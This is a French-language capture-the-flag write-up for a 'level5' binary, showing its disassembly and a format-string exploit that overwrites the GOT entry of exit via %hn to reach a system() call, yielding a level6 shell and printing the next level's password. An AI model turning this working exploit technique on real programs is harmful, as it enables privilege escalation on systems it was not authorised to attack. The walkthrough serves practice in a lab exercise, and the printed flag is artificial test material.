## Démarches


- `objdump -d level5`
  ```
  08048504 <main>:
    8048504:	55                   	push   %ebp
    8048505:	89 e5                	mov    %esp,%ebp
    8048507:	83 e4 f0             	and    $0xfffffff0,%esp
    804850a:	e8 b3 ff ff ff       	call   80484c2 <n>
    804850f:	c9                   	leave
    8048510:	c3                   	ret

  080484a4 <o>:
    80484a4:	55                   	push   %ebp
    80484a5:	89 e5                	mov    %esp,%ebp
    80484a7:	83 ec 18             	sub    $0x18,%esp
    80484aa:	c7 04 24 f0 85 04 08 	movl   $0x80485f0,(%esp)
    80484b1:	e8 fa fe ff ff       	call   80483b0 <system@plt>
    80484b6:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
    80484bd:	e8 ce fe ff ff       	call   8048390 <_exit@plt>

  080484c2 <n>:
    80484c2:	55                   	push   %ebp
    80484c3:	89 e5                	mov    %esp,%ebp
    80484c5:	81 ec 18 02 00 00    	sub    $0x218,%esp
    80484cb:	a1 48 98 04 08       	mov    0x8049848,%eax
    80484d0:	89 44 24 08          	mov    %eax,0x8(%esp)
    80484d4:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
    80484db:	00
    80484dc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
    80484e2:	89 04 24             	mov    %eax,(%esp)
    80484e5:	e8 b6 fe ff ff       	call   80483a0 <fgets@plt>
    80484ea:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
    80484f0:	89 04 24             	mov    %eax,(%esp)
    80484f3:	e8 88 fe ff ff       	call   8048380 <printf@plt>
    80484f8:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
    80484ff:	e8 cc fe ff ff       	call   80483d0 <exit@plt>
  ```

- La fonction `main` appelle une fonction `n` qui ne fait qu'un *printf* de la chaine récupérée depuis *fgets* puis un appel à *exit*
- Une fonction `o` qui fait un appel système existe mais n'est pas utilisée.
- Comme dans les levels précédents, l'appel à printf n'est pas formatté
- `(python -c 'print("AAA0"+"%08x."*4)') | ./level5` nous permet de constater que l'octet qui nous intéresse se situe au 4ème index sur la stack
  > AAA000000200.b7fd1ac0.b7ff37d0.30414141.

- On veut remplacer l'appel d'`exit` par un appel à la fonction `o`
- On récupère l'adresse d'exit avec `objdump -R level5` :
  ```
  level5:     file format elf32-i386

  DYNAMIC RELOCATION RECORDS
  OFFSET   TYPE              VALUE
  08049814 R_386_GLOB_DAT    __gmon_start__
  08049848 R_386_COPY        stdin
  08049824 R_386_JUMP_SLOT   printf
  08049828 R_386_JUMP_SLOT   _exit
  0804982c R_386_JUMP_SLOT   fgets
  08049830 R_386_JUMP_SLOT   system
  08049834 R_386_JUMP_SLOT   __gmon_start__
  08049838 R_386_JUMP_SLOT   exit
  0804983c R_386_JUMP_SLOT   __libc_start_main
  ```
- Comme dans les levels précédents, on va réécrire avec l'option %n de printf. Comme on ne souhaite réécrire que la moitié de l'adresse à l'offset 4, on utilise `%4hn` :
  
   `(python -c 'print("\x38\x98\x04\x08"+"%33952x"+"%4$hn")' ; cat -) | ./level5`
  ```
                                                                                                                                                                                                                                                                                            200
  ls
  ls: cannot open directory .: Permission denied
  pwd
  /home/user/level5
  whoami
  level6
  cat /home/user/level6/.pass
  d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
  ```
<br>
----
## Ressources

- https://www.exploit-db.com/papers/23985
- [Exploit 101 - Format Strings](https://axcheron.github.io/exploit-101-format-strings/)